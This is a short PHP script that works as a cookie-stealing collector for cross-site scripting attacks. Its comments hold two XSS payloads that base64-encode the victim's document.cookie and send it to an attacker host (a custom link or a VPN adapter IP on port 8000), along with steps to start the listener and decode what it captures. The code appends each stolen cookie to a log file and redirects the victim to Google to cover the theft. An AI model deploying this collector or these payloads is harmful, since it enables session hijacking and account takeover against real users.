<?php

# Examples to call
# <h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>HEEEEEY</h1>
# <script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
# then just echo "<content>" | base64 -d
# setup server: php -S 0.0.0.0:<port>
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["cookie"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
